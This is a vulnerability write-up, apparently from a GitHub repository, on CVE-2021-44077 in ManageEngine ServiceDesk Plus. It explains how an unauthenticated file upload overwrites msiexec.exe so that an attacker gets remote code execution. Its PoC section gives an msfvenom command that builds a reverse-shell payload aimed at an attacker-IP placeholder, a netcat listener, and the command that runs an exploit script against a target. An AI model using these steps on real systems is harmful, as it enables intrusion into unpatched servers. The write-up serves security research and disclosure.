# CVE-2021-44077.md

### Overview

On September 16, 2021, the company ManageEngine (a subsidiary of Zoho) released version 11306 of ManageEngine ServiceDesk Plus to patch the vulnerability CVE-2021-44077.

CVE-2021-44077 is an authentication bypass vulnerability affecting (on-premises) installations of ManageEngine ServiceDesk Plus using versions 11305 and earlier.

The source of the vulnerability was an improper security configuration process used in ServiceDesk Plus, and it allowed attackers to gain unauthorized access to the application's data through several of its application URLs.

### Detail

![image](https://user-images.githubusercontent.com/63194321/155062895-5a0d68cd-f333-4b16-87f7-ae29932d86aa.png)

According to ManageEngine on the homepage, this is a vulnerability that bypasses authentication to upload arbitrary files.

The original cause given by the developers was that the APIs did not validate the input and allow uploading and executing those files. 

1. The first is the RestAPI that is called when new software needs to be installed `s247AgentInstallationProcess`.

![image](https://user-images.githubusercontent.com/63194321/155074610-0935d57f-bcc3-4cbb-b156-143025aec5cb.png)

> This RestAPI `s247AgentInstallationProcess` then calls an RestAPI `S247Util.installAgentProgress(apikey)` 

![image](https://user-images.githubusercontent.com/63194321/155075301-bbaffab1-6325-4760-9305-4bf227c7fac5.png)

The main essence of this RestAPI is to call the Windows Installer [msiexec.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec) utility from the command line to install software installed with the `Site24x7WindowsAgent.msi`.

Normally, the `msiexec.exe` utility of ManageEngine ServiceDesk Plus will be located at the path: `ManageEngine\ServicesDesk\bin`. 
And the command line structure to install that is: `C:\Program Files\ManageEngine\ServiceDesk\bin\msiexec.exe /i Site24x7WindowsAgent.msi EDITA1=apikey /qn` 

2. Next we will analyze the file upload without input validation which the main cause here is RestAPI `ImportTechniciansAction`.

![image](https://user-images.githubusercontent.com/63194321/155081111-9914d249-1c13-45e4-968d-c4db220f9076.png)

With the `iuf.getTheFile()` function, RestApi will write files directly to the file without authentication. If the file already exists, the old file() will be overwritten. 

Now if the attacker uploads a file named `msiexec.exe` then the old file in the system will be overwritten. After the attacker calls the API `s247AgentInstallationProcess`, 
the file `msiexec.exe` will be executed from which the attacker can RCE the victim machine. 

### PoC

**Step1:** Download and install ManageEngine ServiceDesk Plus any from 11138 to 11145 or <11306. [Here](http://archives.manageengine.com/service-desk/)
> Before starting ManageEngine ServiceDesk Plus. 
> ![image](https://user-images.githubusercontent.com/63194321/155092510-13ba5666-9dfa-4b83-be9d-67887da6bd78.png)

> After starting ManageEngine ServiceDesk Plus.
> ![image](https://user-images.githubusercontent.com/63194321/155100200-21f41af2-fbae-4cf2-a572-90682ae1b170.png)

**Step2:** Use metasploit to proceed to create an application named `msiexec.exe`. 
> msfvenom -p windows/shell_reverse_tcp LHOST=`ATTACKER.IP` LPORT=`ATTACKER.PORT` -f exe > msiexec.exe

![image](https://user-images.githubusercontent.com/63194321/155109360-47e004dc-f347-4ec4-973a-fb8af9ced0c2.png)

**Step3:** Clone 1 PoC of CVE on [github](https://github.com/horizon3ai/CVE-2021-44077.git) or we can deploy a code by ourselves in python. 

![image](https://user-images.githubusercontent.com/63194321/155109873-052113f0-ebd2-4a70-b736-99fbc492967d.png)

In this folder there is a writing program that sends the file `msiexec.exe` to the victim's windows machine as follows. 

![image](https://user-images.githubusercontent.com/63194321/155110734-9e76a05d-b19b-4aef-b736-0fd9b47a74a7.png)

In the above code there are 2 events:
- The application will first be sent to RestAPI `ImportTechniciansAction` to overwrite the file `msiexec.exe`
- Next, we will call `Site24x7WindowsAgent` to automatically pry the file `msiexec.exe`. 

**Step4:** Enable a listener on the attacker machine whose port is the same port as the metasploit payload. 
> nc -lvnp `ATTACKER.PORT`

**Step5:** Deploy the attack to the victim's machine with the payload. 
> python3 exploit.py http://<TARGET_IP>:<PORT_HTTP_PROXY> <path_to_msiexec.exe>
> ![image](https://user-images.githubusercontent.com/63194321/155114258-9894847d-faec-4d65-b3e5-83a0af448d1d.png)


Final result: 

![image](https://user-images.githubusercontent.com/63194321/155114404-4fb7d982-813d-42d7-8a92-1587ddbb0b87.png)

**_Thanks for reading the full report!! _**

### _Reference_

- https://github.com/horizon3ai/CVE-2021-44077
- https://xz.aliyun.com/t/10631
- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec

